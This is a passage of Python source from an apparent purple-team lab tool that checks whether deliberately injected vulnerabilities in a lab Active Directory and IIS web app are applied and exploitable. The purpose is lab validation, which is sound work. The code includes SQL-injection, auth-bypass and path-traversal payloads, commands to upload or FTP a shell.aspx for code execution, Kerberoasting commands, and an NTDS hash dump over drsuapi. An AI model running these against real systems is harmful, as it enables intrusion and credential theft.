    return False, f"/{path} responded but without the marker — {what} not present (app absent or neutralized)."


# path -> (query params, response marker, human label) for the GET-based web vulns.
WEBAPP_GET_CHECKS = {
    "webapp-path-traversal": ("app/download.aspx", {"file": "../pf_lfi_canary.txt"}, "PF-LFI-CANARY", "path traversal"),
    "webapp-auth-bypass": ("app/login.aspx", {"user": "admin' OR '1'='1", "pass": "x"}, "AUTH_OK:admin", "auth bypass"),
    "webapp-ssrf": ("app/fetch.aspx", {"url": "http://127.0.0.1/health.html"}, "PurpleForge IIS baseline OK", "SSRF to loopback"),
}

WEBAPP_SQLI_MARKER = "PF-SQLI-OK"


def _webapp_sqli_probe(host_ip: str) -> tuple[bool | None, str]:
    """Confirm the SQL-injection web app: GET /app/search.aspx with a UNION payload
    that echoes a known marker. The marker in the response proves the injected SQL
    executed (BOTH applied — vulnerable app deployed — AND exploitable). Read-only
    SELECT, no state change. Returns (True/False/None, evidence)."""
    curl = shutil.which("curl")
    if not curl:
        return None, "curl not on PATH — install it to auto-validate; command left for you below."
    url = f"http://{host_ip}/app/search.aspx"
    payload = f"zzz' UNION SELECT '{WEBAPP_SQLI_MARKER}'-- -"
    try:
        r = subprocess.run(
            [curl, "-s", "-m", "15", "-G", "--data-urlencode", f"name={payload}", url],
            capture_output=True,
            text=True,
            timeout=25,
        )
    except (subprocess.TimeoutExpired, OSError):
        return None, f"GET to {url} did not complete (timeout/unreachable) — retry the command below."
    if r.returncode != 0:
        return None, f"could not reach {url} (curl rc={r.returncode}) — retry the command below."
    if WEBAPP_SQLI_MARKER in (r.stdout or ""):
        return True, f"injected UNION payload echoed {WEBAPP_SQLI_MARKER} from {url} — SQL injection confirmed."
    return False, f"{url} responded but the injected UNION did not execute — app absent or queries parameterized (webapp_sql_parameterization may have neutralized it)."


def _nxc_run(cmd: list[str]) -> str | None:
    """Run an nxc/netexec command, returning combined stdout+stderr, or None if it
    could not run at all (never raises — a live check failing is data, not a crash)."""
    try:
        res = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
        return (res.stdout or "") + (res.stderr or "")
    except (subprocess.TimeoutExpired, OSError):
        return None


def _winrm_run(nxc: str, host_ip: str, user: str, password: str, script: str) -> str | None:
    """Run a PowerShell one-liner over WinRM via nxc/netexec's `-X`, returning
    combined stdout+stderr, or None if it could not run at all (auth/timeout —
    a failed live check is data, not a crash)."""
    try:
        res = subprocess.run(
            [nxc, "winrm", host_ip, "-u", user, "-p", password, "-X", script],
            capture_output=True,
            text=True,
            timeout=180,
        )
        return (res.stdout or "") + (res.stderr or "")
    except (subprocess.TimeoutExpired, OSError):
        return None


def _winrm_check_result(out: str) -> bool | None:
    """Parse the PF_CHECK:True/False marker line a WINRM_APPLIED_CHECKS script
    prints. None if the marker never appeared (auth failure, WinRM down, the
    host unreachable over the tunnel)."""
    for line in out.splitlines():
        if "PF_CHECK:True" in line:
            return True
        if "PF_CHECK:False" in line:
            return False
    return None


def _nxc_query_nonempty(out: str) -> bool:
    """Heuristic: netexec's ldap --query prints one line per matched attribute
    (containing 'CN=', a DN, or 'Response:'/'objectClass' markers) after its
    banner. Treat any such content line as a non-empty result — deliberately
    conservative so we never claim 'not applied' on unfamiliar output."""
    markers = ("CN=", "DC=", "objectClass", "sAMAccountName", "msDS-", "Response for object")
    return any(any(mk in line for mk in markers) for line in out.splitlines())


def _live_command(
    vid: str,
    dc_ip: str,
    domain: str,
    admin_user: str,
    target_ip: str | None = None,
    account: str | None = None,
    password: str | None = None,
) -> str:
    """The exact copy-pasteable command an operator runs to confirm a vuln the
    harness can't safely auto-confirm. Uses <PASS> as a placeholder for the lab
    admin's password (a real secret, not echoed here) — the real password is in
    lab-report.md / terraform.tfvars.json. mssql-weak-sa is the one exception:
    its `password` IS the vulnerability (a deliberately known-weak sa
    credential, same treatment as the roastable accounts' cracked hashes in the
    validation report), so it's safe and useful to print directly."""
    dc_ip = dc_ip or "<dc-ip>"
    base = f"nxc ldap {dc_ip} -u {admin_user} -p '<PASS>' -d {domain}"
    if vid in ROAST_FLAGS:
        return f"{base} {ROAST_FLAGS[vid][0]} out --kdcHost {dc_ip}"
    if vid in LDAP_APPLIED_FILTERS:
        return f'{base} --query "{LDAP_APPLIED_FILTERS[vid][0]}" ""'
    if vid in WINRM_APPLIED_CHECKS:
        script = WINRM_APPLIED_CHECKS[vid].replace("__ACCOUNT__", account or "<account>")
        return f"nxc winrm {target_ip or '<host-ip>'} -u {admin_user} -p '<PASS>' -X \"{script}\""
    if vid == "mssql-weak-sa":
        return f"nxc mssql {target_ip or '<host-ip>'} -u sa -p '{password or '<sa-pass>'}' --local-auth -x whoami"
    if vid == "ldap-anonymous-bind":
        return f'nxc ldap {dc_ip} -u "" -p "" --query "(objectClass=domain)" ""  # anonymous bind must return objects'
    if vid == "iis-webdav-anonymous-write":
        ip = target_ip or "<host-ip>"
        return (
            f"curl -s -X PUT --data {WEBDAV_PROBE_MARKER} http://{ip}/{WEBDAV_PROBE_NAME} "
            f"&& curl -s http://{ip}/{WEBDAV_PROBE_NAME}  # 201 then the marker = anonymous write works"
        )
    if vid == "webapp-unrestricted-upload":
        ip = target_ip or "<host-ip>"
        return (
            f"curl -s -F 'f=@shell.aspx;filename={WEBAPP_UPLOAD_PROBE_NAME}' http://{ip}/app/upload.aspx "
            f"&& curl -s http://{ip}/app/{WEBAPP_UPLOAD_PROBE_NAME}  # UPLOAD_OK then marker = unrestricted upload (use a .aspx for RCE)"
        )
    if vid == "webapp-sql-injection":
        ip = target_ip or "<host-ip>"
        return (
            f"curl -s -G --data-urlencode \"name=zzz' UNION SELECT '{WEBAPP_SQLI_MARKER}'-- -\" "
            f"http://{ip}/app/search.aspx  # response contains {WEBAPP_SQLI_MARKER} = SQLi works"
        )
    if vid in WEBAPP_GET_CHECKS:
        path, params, marker, _what = WEBAPP_GET_CHECKS[vid]
        ip = target_ip or "<host-ip>"
        args = " ".join(f"--data-urlencode \"{k}={v}\"" for k, v in params.items())
        return f"curl -s -G {args} http://{ip}/{path}  # response contains '{marker}' = vuln works"
    if vid == "ftp-anonymous-access":
        return f"nxc ftp {target_ip or '<host-ip>'} -u anonymous -p ''  # anonymous login succeeds + lists the root (grab backup_creds.txt)"
    if vid == "ftp-write-webroot":
        ip = target_ip or "<host-ip>"
        return (
            f"curl -s -T shell.aspx ftp://{ip}/{FTP_PROBE_NAME} --user anonymous: "
            f"&& curl -s http://{ip}/{FTP_PROBE_NAME}  # anonymous STOR then HTTP GET = FTP-write -> HTTP-exec (use a .aspx for RCE)"
        )
    return f"bloodhound-python -d {domain} -u {admin_user} -p '<PASS>' -dc {dc_ip} -c All  # then inspect the {vid} edge in BloodHound"


def build_vuln_check(vuln: dict, catalog_entry: dict) -> dict:
    """For one planned vuln, the two things its validation confirms: APPLIED (the
    AD artifact/edge that proves the injection landed) and EXPLOITABLE (the
    technique/primitive to run to prove it works). Pulled from the catalog's
    validate/attack metadata — no detection/coverage prediction."""
    validate = (catalog_entry or {}).get("validate", {}) or {}
    attack = (catalog_entry or {}).get("attack", {}) or {}
    account_key, password_key = VULN_CREDENTIAL_VARS.get(vuln["id"], (None, None))
    account = (vuln.get("vars") or {}).get(account_key) if account_key else None
    password = (vuln.get("vars") or {}).get(password_key) if password_key else None
    return {
        "id": vuln["id"],
        "mitre": vuln["mitre"],
        "run_on": vuln["run_on"],
        "account": account,
        "password": password,
        "neutralization": vuln["neutralization"].split(" (")[0],
        "applied_signature": validate.get("bloodhound_edge") or "AD artifact created by the inject primitive",
        "exploit_check": validate.get("atomic") or "run the vuln's attack primitive",
        "intended_path": vuln.get("intended_path") or " ".join((attack.get("intended_path") or "").split()),
    }


def render_results_template(rows: list[dict]) -> dict:
    """The skeleton the live validation run fills in: per vuln, whether the config
    is APPLIED and whether it is EXPLOITABLE (YES/NO/PARTIAL) plus an evidence
    string. Feeding it back via `validate --results` writes the confirmed report."""
    return {
        "_help": f"Per vuln set `applied` and `exploitable` to one of {list(VALID_RESULT)} from the live check, plus an `evidence` string. Then: forge validate <spec> --results <this file>.",
        "vulns": [
            {"id": r["id"], "mitre": r["mitre"], "applied": None, "exploitable": None, "evidence": ""} for r in rows
        ],
    }


def merge_validation_results(rows: list[dict], results: dict) -> tuple[list[dict], list[str]]:
    """Crosses the per-vuln checks with the live results, returning the confirmed
    list (each row gains applied/exploitable/evidence) and human-readable findings
    (config that didn't land, or landed but isn't exploitable). Raises SpecError on
    a malformed results file."""
    by_id = {v.get("id"): v for v in results.get("vulns", [])}
    confirmed: list[dict] = []
    findings: list[str] = []

    for r in rows:
        res = by_id.get(r["id"]) or {}
        row = dict(r)
        for field in ("applied", "exploitable"):
            val = res.get(field)
            if val is not None and val not in VALID_RESULT:
                raise SpecError(f"vuln {r['id']}: {field} '{val}' is not one of {list(VALID_RESULT)}")
            row[field] = val or "PENDING"
        row["evidence"] = res.get("evidence", "")
        if row["applied"] == "NO":
            findings.append(
                f"{r['id']}: config NOT applied — injection did not land (expected artifact: {r['applied_signature']})."
            )
        elif row["applied"] == "PENDING":
            findings.append(f"{r['id']}: no live result recorded.")
        elif row["exploitable"] == "NO":
            findings.append(
                f"{r['id']}: applied but NOT exploitable — a control may have neutralized it ({row['evidence'] or 'no evidence given'})."
            )
        confirmed.append(row)
    return confirmed, findings


def render_validation_report(lab_name: str, confirmed: list[dict], findings: list[str], lab_dir: Path) -> Path:
    """The confirmed validation section of the deliverable: per vuln, was the config
    applied and is it exploitable, with evidence. purple-validator folds this into
    lab-report.md."""
    n = len(confirmed)
    applied_yes = sum(1 for r in confirmed if r["applied"] == "YES")
    exploit_yes = sum(1 for r in confirmed if r["exploitable"] == "YES")
    lines = [
        f"# Vulnerability validation — {lab_name}",
        "",
        f"_Confirmed {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')} against the live lab. Each injected vuln is checked for two things: the config was APPLIED correctly (the AD artifact landed) and it is actually EXPLOITABLE. This is not a detection/coverage matrix._",
        "",
        f"- Config applied: **{applied_yes}/{n}**",
        f"- Exploitable: **{exploit_yes}/{n}**",
        "",
        "| Vuln | ATT&CK | Host | Applied | Exploitable | Evidence | Manual command (if any) |",
        "|---|---|---|---|---|---|---|",
    ]
    for r in confirmed:
        needs_cmd = r["applied"] in ("REQUIRES-HUMAN", "PENDING") or r["exploitable"] in ("REQUIRES-HUMAN", "PENDING")
        cmd = f"`{r['command']}`" if (needs_cmd and r.get("command")) else "—"
        lines.append(
            f"| {r['id']} | {r['mitre']} | {r['run_on']} | **{r['applied']}** | "
            f"**{r['exploitable']}** | {r.get('evidence') or '—'} | {cmd} |"
        )
    lines += ["", "## Findings", ""]
    lines += [f"- {f}" for f in findings] if findings else ["- None — every injected vuln is applied and exploitable."]
    lines.append("")
    report_path = lab_dir / "validation-report.md"
    report_path.write_text("\n".join(lines), encoding="utf-8")
    (lab_dir / "validation-report.json").write_text(
        json.dumps(
            {
                "lab": lab_name,
                "summary": {"applied": applied_yes, "exploitable": exploit_yes, "total": n},
                "findings": findings,
                "vulns": confirmed,
            },
            indent=2,
        )
        + "\n",
        encoding="utf-8",
    )
    return report_path


def cmd_validate(args: argparse.Namespace) -> int:
    """Vulnerability validation for a generated lab: per injected vuln, the AD
    artifact that proves the config was APPLIED and the check that proves it is
    EXPLOITABLE. Writes validation-plan.{json,md} (the per-vuln checklist) plus a
    validation-results.template.json. With --results <file>, merges the live
    YES/NO/PARTIAL results into the confirmed validation-report.md. Validation is
    about applied+exploitable — NOT detection coverage (out of scope)."""
    spec_path = Path(args.spec).resolve()
    if not spec_path.exists():
        print(f"error: spec file not found: {spec_path}", file=sys.stderr)
        return 2
    spec = load_yaml(spec_path)
    lab_name = spec["lab"]["name"]
    lab_dir = Path(args.out_dir) if args.out_dir else GENERATED_DIR / lab_name
    manifest_path = lab_dir / "lab-manifest.json"
    if not manifest_path.exists():
        print(f"error: {manifest_path} not found — run `generate` first.", file=sys.stderr)
        return 2

    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    catalog = load_vuln_catalog()
    planned = manifest.get("vulnerabilities_planned", [])
    if not planned:
        print("note: this lab has no injected vulnerabilities — nothing to validate.")
        return 0

    rows = [build_vuln_check(v, catalog.get(v["id"], {})) for v in planned]
    plan = {
        "lab": lab_name,
        "generated_at": datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC"),
        "note": "Per-vuln validation checklist. Confirm live that each config was APPLIED (artifact present) and is EXPLOITABLE. Not a detection/coverage matrix.",
        "vulns": rows,
    }
    (lab_dir / "validation-plan.json").write_text(json.dumps(plan, indent=2) + "\n", encoding="utf-8")

    lines = [
        f"# Vulnerability validation plan — {lab_name}",
        "",
        f"_Generated {plan['generated_at']} from `lab-manifest.json`. For each injected vuln,",
        "confirm two things live: the config was **applied** (the AD artifact landed) and it is",
        "actually **exploitable**. This is not a detection/coverage matrix._",
        "",
        "| Vuln | ATT&CK | Host | Reconciliation | Applied signature (confirm present) | Exploitability check |",
        "|---|---|---|---|---|---|",
    ]
    for r in rows:
        lines.append(
            f"| {r['id']} | {r['mitre']} | {r['run_on']} | {r['neutralization']} | "
            f"{r['applied_signature']} | {r['exploit_check']} |"
        )
    lines += [
        "",
        "## How to confirm each vuln",
        "",
        "1. **Applied** — query AD with a signing-aware client (e.g. `nxc`) for the artifact in",
        "   the 'Applied signature' column (a UAC flag, an SPN, an ACE, a group membership, a",
        "   SYSVOL file…). Present ⇒ the injection landed.",
        "2. **Exploitable** — run the primitive in the last column (roast the hash, read the",
        "   cpassword, abuse the ACL) and confirm it actually yields what it should.",
        "3. Record YES/NO/PARTIAL + evidence per vuln in the results template, then re-run with",
        "   `--results` to write the confirmed report.",
        "",
    ]
    (lab_dir / "validation-plan.md").write_text("\n".join(lines), encoding="utf-8")

    # The template only makes sense as a starting point — don't clobber a results
    # file the operator is already filling in.
    template_path = lab_dir / "validation-results.template.json"
    if not template_path.exists():
        template_path.write_text(json.dumps(render_results_template(rows), indent=2) + "\n", encoding="utf-8")

    print(f"OK: wrote {lab_dir / 'validation-plan.json'}, validation-plan.md, validation-results.template.json")
    for r in rows:
        print(
            f"    - {r['id']} [{r['mitre']}] on {r['run_on']}: applied? [{r['applied_signature']}]  exploitable? [{r['exploit_check']}]"
        )

    # --run: do the live checks ourselves and write the confirmed report directly,
    # collapsing the fill-a-JSON-by-hand loop into one command.
    if getattr(args, "run", False):
        try:
            confirmed, findings = run_live_validation(rows, manifest, lab_dir)
        except SpecError as e:
            print(f"error: cannot run live validation: {e}", file=sys.stderr)
            return 1
        report_path = render_validation_report(lab_name, confirmed, findings, lab_dir)
        applied_yes = sum(1 for r in confirmed if r["applied"] == "YES")
        exploit_yes = sum(1 for r in confirmed if r["exploitable"] == "YES")
        need_human = sum(
            1
            for r in confirmed
            if "REQUIRES-HUMAN" in (r["applied"], r["exploitable"]) or "PENDING" in (r["applied"], r["exploitable"])
        )
        print(f"OK: wrote {report_path} (live run)")
        print(
            f"  auto-confirmed applied: {applied_yes}/{len(confirmed)}, exploitable: {exploit_yes}/{len(confirmed)}; {need_human} need a manual command (listed in the report + findings)"
        )
        for r in confirmed:
            print(f"    - {r['id']}: applied={r['applied']} exploitable={r['exploitable']}")
        return 0

    if args.results:
        results_path = Path(args.results).resolve()
        if not results_path.exists():
            print(f"error: --results file not found: {results_path}", file=sys.stderr)
            return 2
        try:
            results = json.loads(results_path.read_text(encoding="utf-8"))
            confirmed, findings = merge_validation_results(rows, results)
        except (json.JSONDecodeError, SpecError) as e:
            print(f"error: bad --results file: {e}", file=sys.stderr)
            return 1
        report_path = render_validation_report(lab_name, confirmed, findings, lab_dir)
        applied_yes = sum(1 for r in confirmed if r["applied"] == "YES")
        exploit_yes = sum(1 for r in confirmed if r["exploitable"] == "YES")
        print(f"OK: wrote {report_path} (confirmed)")
        print(
            f"  applied: {applied_yes}/{len(confirmed)}, exploitable: {exploit_yes}/{len(confirmed)}; {len(findings)} finding(s)"
        )

    return 0


def query_ad_inventory(dc_ip: str, domain: str, admin_user: str, admin_password: str) -> dict:
    from ldap3 import ALL, SIMPLE, SUBTREE, Connection, Server

    upn = f"{admin_user}@{domain}"
    base_dn = ",".join(f"DC={p}" for p in domain.split("."))
    server = Server(dc_ip, port=389, get_info=ALL, connect_timeout=15)
    conn = Connection(server, user=upn, password=admin_password, authentication=SIMPLE, receive_timeout=30)
    if not conn.bind():
        raise SpecError(f"LDAP bind to {dc_ip} as {upn} failed: {conn.result}")

    def dn_to_name(dn: str) -> str:
        return dn.split(",", 1)[0].split("=", 1)[1]

    conn.search(
        base_dn,
        "(&(objectClass=user)(objectCategory=person))",
        SUBTREE,
        attributes=["sAMAccountName", "userAccountControl", "memberOf", "description"],
    )
    users = []
    for e in conn.entries:
        uac = int(e.userAccountControl.value)
        member_of = [dn_to_name(dn) for dn in e.memberOf.values] if "memberOf" in e else []
        users.append(
            {
                "username": str(e.sAMAccountName),
                "enabled": not (uac & 2),  # ADS_UF_ACCOUNTDISABLE
                "description": str(e.description) if "description" in e and e.description else "",
                "groups": sorted(member_of),
            }
        )

    conn.search(base_dn, "(objectClass=group)", SUBTREE, attributes=["sAMAccountName", "description", "member"])
    groups = []
    for e in conn.entries:
        members = [dn_to_name(dn) for dn in e.member.values] if "member" in e else []
        groups.append(
            {
                "name": str(e.sAMAccountName),
                "description": str(e.description) if "description" in e and e.description else "",
                "members": sorted(members),
            }
        )
    conn.unbind()

    hashes: dict[str, dict] = {}
    nxc_bin = shutil.which("nxc") or shutil.which("netexec")
    if nxc_bin:
        result = subprocess.run(
            [nxc_bin, "smb", dc_ip, "-d", domain, "-u", admin_user, "-p", admin_password, "--ntds", "drsuapi"],
            capture_output=True,
            text=True,
            timeout=300,
        )
        # nxc's own line format: "SMB   <ip>   445   <hostname>   <domain\>user:rid:lmhash:nthash:::"
        for line in result.stdout.splitlines():
            m = re.search(r"(?:^|\s)(?:[^\s\\]+\\)?([^\s:]+):(\d+):([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):::", line)
            if m:
                hashes[m.group(1)] = {"rid": m.group(2), "nt_hash": m.group(4)}

    return {"users": users, "groups": groups, "hashes": hashes, "nxc_available": bool(nxc_bin)}


def cmd_ad_inventory(args: argparse.Namespace) -> int:
    spec_path = Path(args.spec).resolve()
    if not spec_path.exists():
        print(f"error: spec file not found: {spec_path}", file=sys.stderr)
        return 2
    spec = load_yaml(spec_path)
    lab_name = spec["lab"]["name"]
    lab_dir = Path(args.out_dir) if args.out_dir else GENERATED_DIR / lab_name

    inventory_path = lab_dir / "ansible" / "inventory" / "hosts.yml"
    manifest_path = lab_dir / "lab-manifest.json"
    if not inventory_path.exists() or not manifest_path.exists():
        print(
            f"error: {lab_dir} has no generated inventory/manifest — run `generate` (and deploy) first.",
            file=sys.stderr,
        )
        return 2

    inventory = load_yaml(inventory_path)
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))

    dcs = inventory.get("all", {}).get("children", {}).get("domain_controllers", {}).get("hosts", {})
    if not dcs:
        print("error: no domain_controllers found in the generated inventory.", file=sys.stderr)
        return 2
    dc_host = next(iter(dcs.values()))
    dc_ip = dc_host["ansible_host"]
    domain = dc_host["domain"]
    admin_user = dc_host["domain_username"].split("\\")[-1]
    admin_password = dc_host["domain_password"]

    print(f"Querying live domain {domain} via {dc_ip} ...")
    try:
        data = query_ad_inventory(dc_ip, domain, admin_user, admin_password)
    except SpecError as e:
        print(f"error: {e}\n  Is the WireGuard tunnel up, and is this lab actually deployed?", file=sys.stderr)
        return 1
    except ImportError:
        print("error: ldap3 not installed — pip install -r scripts/requirements.txt", file=sys.stderr)
        return 2
    if not data["nxc_available"]:
        print(
            "warning: `nxc`/`netexec` not found on PATH — NT hashes will be omitted. "
            "Install it (pipx install netexec) to include them.",
            file=sys.stderr,
        )

    vuln_accounts: dict[str, str] = {}
    for v in manifest.get("vulnerabilities_planned", []):
        for k, val in v.get("vars", {}).items():
            if k.endswith("_account"):
                vuln_accounts[val] = v["id"]

    builtin_privileged = {"Domain Admins", "Enterprise Admins", "Administrators", "Schema Admins"}
    theme_privileged: set[str] = set()
    theme_id = manifest.get("theme")
    if theme_id:
        try:
            theme = load_theme(theme_id)
            theme_privileged = {g["name"] for g in theme.get("extra_groups", [])}
        except SpecError:
            pass  # theme file missing/moved since generate — privileged-group tagging just degrades to builtins only
    privileged_groups = builtin_privileged | theme_privileged

    for u in data["users"]:
        u["nt_hash"] = data["hashes"].get(u["username"], {}).get("nt_hash")
        u["vuln_id"] = vuln_accounts.get(u["username"])
        u["privileged"] = bool(privileged_groups & set(u["groups"]))
    for g in data["groups"]:
        g["privileged"] = g["name"] in privileged_groups

    # Verification, not discovery: population_plans already says exactly who
    # SHOULD exist — flag anything missing (a failed/partial ad-population.yml
    # run) rather than just reporting whatever LDAP happens to return.
    planned_names = {
        u["name"] for p in manifest.get("population_plans", []) if p["domain"] == domain for u in p["users"]
    }
    live_names = {u["username"] for u in data["users"]}
    missing = planned_names - live_names
    if planned_names and missing:
        print(
            f"warning: {len(missing)} of {len(planned_names)} planned population users were NOT found live — ad-population.yml may not have completed.",
            file=sys.stderr,
        )

    template = jinja2.Template(
        (TEMPLATES_DIR / "ad-inventory.md.j2").read_text(encoding="utf-8"), keep_trailing_newline=True
    )
    rendered = template.render(
        lab_name=lab_name,
        domain=domain,
        dc_ip=dc_ip,
        users=sorted(data["users"], key=lambda u: u["username"].lower()),
        groups=sorted(data["groups"], key=lambda g: g["name"].lower()),
        nxc_available=data["nxc_available"],
        generated_at=datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC"),
    )
    out_path = lab_dir / "ad-inventory.md"
    out_path.write_text(rendered, encoding="utf-8")
    print(
        f"OK: wrote {out_path} ({len(data['users'])} users, {len(data['groups'])} groups, {len(data['hashes'])} NT hashes)"
    )
    return 0
